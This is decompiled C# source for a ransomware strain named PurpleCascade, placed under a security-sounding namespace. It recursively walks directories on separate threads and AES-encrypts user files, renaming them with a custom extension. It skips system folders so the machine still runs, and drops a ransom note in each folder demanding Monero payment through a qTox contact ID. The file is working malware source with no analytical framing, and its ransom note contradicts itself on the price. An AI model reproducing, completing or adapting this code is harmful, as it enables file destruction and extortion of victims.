using System;
using System.IO;
using System.Linq;
using System.Threading;

namespace WindowsRuntimeSecurity.Encrypter
{
	// Token: 0x02000008 RID: 8
	internal class DirectoryAndFileDiscovery
	{
		// Token: 0x06000015 RID: 21 RVA: 0x00002888 File Offset: 0x00000A88
		public static void SearchFilesAndDirectories(string path)
		{
			try
			{
				foreach (string path2 in Directory.GetFiles(path))
				{
					try
					{
						if (!DirectoryAndFileDiscovery.InvalidExtension.Contains(Path.GetExtension(path2)) && !Path.GetFileName(path2).Contains("ALL_OF_YOUR_FILES_ARE_ENCRYPTED_README.txt"))
						{
							DirectoryAndFileDiscovery.EncryptFile(path2);
						}
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
			try
			{
				string[] array = Directory.GetDirectories(path);
				for (int i = 0; i < array.Length; i++)
				{
					string directory = array[i];
					try
					{
						if (!DirectoryAndFileDiscovery.BlackListedPaths.Contains(directory.ToLower()))
						{
							new Thread(delegate()
							{
								DirectoryAndFileDiscovery.DropReadMe(directory);
								DirectoryAndFileDiscovery.SearchFilesAndDirectories(directory);
							}).Start();
						}
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000016 RID: 22 RVA: 0x00002974 File Offset: 0x00000B74
		private static void DropReadMe(string pathToDrop)
		{
			string contents = "\r\n    ___  ___________________   ________________  _   ____\r\n   /   |/_  __/_  __/ ____/ | / /_  __/  _/ __ \\/ | / / /\r\n  / /| | / /   / / / __/ /  |/ / / /  / // / / /  |/ / / \r\n / ___ |/ /   / / / /___/ /|  / / / _/ // /_/ / /|  /_/  \r\n/_/  |_/_/   /_/ /_____/_/ |_/ /_/ /___/\\____/_/ |_(_)   \r\n                                                         \r\n\r\n\ud835\ude08\ud835\ude13\ud835\ude13 \ud835\ude16\ud835\ude0d \ud835\ude20\ud835\ude16\ud835\ude1c\ud835\ude19 \ud835\ude0d\ud835\ude10\ud835\ude13\ud835\ude0c\ud835\ude1a \ud835\ude0f\ud835\ude08\ud835\ude1d\ud835\ude0c \ud835\ude09\ud835\ude0c\ud835\ude0c\ud835\ude15 \ud835\ude0c\ud835\ude15\ud835\ude0a\ud835\ude19\ud835\ude20\ud835\ude17\ud835\ude1b\ud835\ude0c\ud835\ude0b \ud835\ude09\ud835\ude20 \ud835\ude17\ud835\ude36\ud835\ude33\ud835\ude31\ud835\ude2d\ud835\ude26\ud835\ude0a\ud835\ude22\ud835\ude34\ud835\ude24\ud835\ude22\ud835\ude25\ud835\ude26!\r\nYOUR FILES HAVE BEEN ENCRYPTED WITH MILITARY-GRADE ENCRYPTION ALGORITHM AND IS PERMANENTLY ENCRYPTED UNLESS\r\nYOU PAY FOR OUR SERVICES!\r\n\r\nQ.1> What happened?\r\n---> All of your sensitive files have been encrypted by PurpleCascade ransomware. You cannot\r\n     decrypt your files without our special decryption tool.\r\n\r\nQ.2> How can I get back my files?\r\n---> You can get back your files only if you pay for our decryption tool. The price for our\r\n     decryption tool is $1,200 and can be purchased only using Monero. Attempting to decrypt\r\n     your files without our service will only permanently damage your files even more,\r\n     making it impossible to recover even with our decryption tool. Also, PLEASE SPECIFY YOUR VERSION\r\n\tOF PURPLECASCADE BELOW!!!\r\n\r\nQ.3> How can I pay?\r\n---> As mentioned above, you need to pay us $1,500 in Monero. You can get customer support\r\n     via qTox, our ID is 0F87E1BAF92E5535EB9D097374150FC7E97F54C97EFB6A5A202F632B6EFD3C28F15588421ACB.\r\n     Download qTox from: https://tox.chat/download.html (\ud835\ude4e\ud835\ude40\ud835\ude47\ud835\ude40\ud835\ude3e\ud835\ude4f \ud835\ude4a\ud835\ude49\ud835\ude47\ud835\ude54 \ud835\ude66\ud835\ude4f\ud835\ude64\ud835\ude6d!). We will send you\r\n     the XMR address you should pay us to, and also guide you on transaction, and give you\r\n     free technical support.\r\n\r\nQ.4> Can I trust this process?\r\n---> Of course you can! Our decryption tools have been tested and work 100%, and we will\r\n     surely give you decryption tool when you will pay us. We DO NOT scam people as then\r\n     no one will pay us in return.\r\n\r\nPurpleCascade version: CVXC";
			try
			{
				File.WriteAllText(pathToDrop + "\\ALL_OF_YOUR_FILES_ARE_ENCRYPTED_README.txt", contents);
			}
			catch
			{
			}
		}

		// Token: 0x06000017 RID: 23 RVA: 0x000029B0 File Offset: 0x00000BB0
		private static void EncryptFile(string path)
		{
			string plainText = File.ReadAllText(path);
			string contents = DirectoryAndFileDiscovery.CryptoService.AES_Encrypt(plainText);
			File.Move(path, path + ".prplcscd_cvxcv");
			File.WriteAllText(path + ".prplcscd_cvxcv", contents);
		}

		// Token: 0x04000003 RID: 3
		private static string[] BlackListedPaths = new string[]
		{
			"\\windows",
			"\\program files\\microsoft office",
			"\\program files (x86)\\microsoft office\\",
			"\\program files\\avs\\",
			"\\program files (x86)\\avs\\",
			"\\$recycle.bin\\",
			"\\boot\\",
			"\\recovery\\",
			"\\system volume information\\",
			"\\msocache\\",
			"\\users\\all users\\",
			"\\users\\default user\\",
			"\\users\\default\\",
			"\\temp\\",
			"\\inetcache\\",
			"\\google\\"
		};

		// Token: 0x04000004 RID: 4
		private static string[] InvalidExtension = new string[]
		{
			".exe",
			".dll",
			".sys",
			".ini",
			".lnk",
			".vbm",
			".prplcscd_cvxc"
		};

		// Token: 0x04000005 RID: 5
		private static AesCryptoService CryptoService = new AesCryptoService();
	}
}
